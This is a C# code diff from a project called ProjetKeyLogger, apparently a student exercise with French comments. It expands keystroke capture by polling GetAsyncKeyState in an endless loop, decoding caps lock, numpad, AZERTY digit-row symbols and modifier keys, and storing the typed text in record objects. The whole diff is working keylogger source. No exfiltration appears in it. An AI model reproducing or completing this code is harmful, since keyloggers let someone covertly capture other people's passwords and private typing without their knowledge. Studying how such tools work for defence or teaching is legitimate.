@@ -45,6 +45,7 @@ namespace ProjetKeyLogger
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(int cle);
 
+        //La fonction capture ne marche pas avec des claviers tactiles sur l'écran
         public void capture()
         {
             //Création d'un objet Enregistrement qui contiendra le contenu de la capture clavier
@@ -54,6 +55,7 @@ namespace ProjetKeyLogger
             int nb_caractere_tape = 0;
 
             //capture les frappes de touches et les afficher dans la console
+            bool majuscule = false;
             while (true) //boucle "infinie" pour avoir le statut des touches en temps réel
             {
                 //Comme on a une boucle infinie, il faut permettre aux autres fonctions de se déclencher et donc arreter la boucle temporairement
@@ -63,37 +65,98 @@ namespace ProjetKeyLogger
                 //verification de l'état de chaque touche (up ou down)
                 //avec une table des code ASCII, les codes de clavier vont de 0 à 127
                 //on va vérifier ces 128 touches
+                
                 for (int codeASCII = 0; codeASCII < 128; codeASCII++)
                 {
                     int statut_cle = GetAsyncKeyState(codeASCII);
                     //le statut d'un clé est a 0 si elle n'est pas active
                     //le statut est a 32769 si la touche est appuyé donc on va pouvoir voir les touches
                     // on caste le nombre ascii en char
+                   
                     if (statut_cle == 32769)
-                    {
-                        Console.Write((char)codeASCII);
-
-                        
-
-                        //probleme : tout en majuscule + certaines touches non detectées
-
-
+                    {                        
                         switch (codeASCII)
                         {
+                            
                             //Si touche Entrée
                             case 13:
+                                //Sinon on peut faire un console.writeline tout simplement ?
                                 //On ajoute l'enregistrement a la collection
                                 collection_enregistrement.ajouterNew(enregistrement);
 
                                 //On réinitialise l'enregistrement
                                 enregistrement = new Enregistrement();
                                 break;
-
+                            //si touche maj
+                            case 20:
+                                if ( majuscule == false)
+                                {
+                                    majuscule = true;
+                                } else
+                                {
+                                    majuscule = false;
+                                }
+                                                                   
+                                break;
                             case 8:
-                               enregistrement.effacerContenu();
+                                // enregistrement.effacerContenu();
+                                break;
+
+                            case 110:
+                                Console.Write(".");
+                                break;
+
+                            case 107:
+                                Console.Write("+");
+                                break;
+
+                            case 109:
+                                Console.Write("-");
+                                break;
+
+                            case 106:
+                                Console.Write("*");
+                                break;
+
+                            case 111:
+                                Console.Write("/");
+                                break;
+
+                            //A FAIRE : les ctrl; alt ctrl etc mais comment les representer ?
+                            case 17:
+                                Console.Write("[ctrl]");
+                                break;
+                            case 18:
+                                Console.Write("[alt]");
+                                break;
+                            case 91:
+                                Console.Write("[WINDOWS]");
                                 break;
 
                             default:
+                                //probleme du pavé numérique
+                                //le 0 correspond au code 96 c'est pour cela que l'on fait -96 à tous au lieu d'affecter une valeur à chaque nombre
+                                if (codeASCII > 95 & codeASCII < 106)
+                                {
+                                    Console.Write((int)codeASCII - 96);
+                                }
+                                else
+                                {//clavier des lettres : distinction majuscules ou non
+                                    if (majuscule == false)
+                                        //cas des caracteres speciaux au lieu des chiffres
+                                        if (codeASCII >47 & codeASCII < 58)
+                                        {
+                                            string valeurs="à&é\"'(-è_ç";
+                                            Console.Write(valeurs.Substring(codeASCII-48,1));
+                                        } else
+                                        {
+                                            Console.Write(Char.ToLower((char)codeASCII));
+                                        }
+                                    else
+                                    {
+                                        Console.Write(Char.ToUpper((char)codeASCII));
+                                    }
+                                }
                                 //Concatenation e la derniere touche tapée au contenu de l'enregistrement
                                 enregistrement.ajouterContenu((char)codeASCII);
                                 //Sinon on incrémente le nombre de caracteres tapé
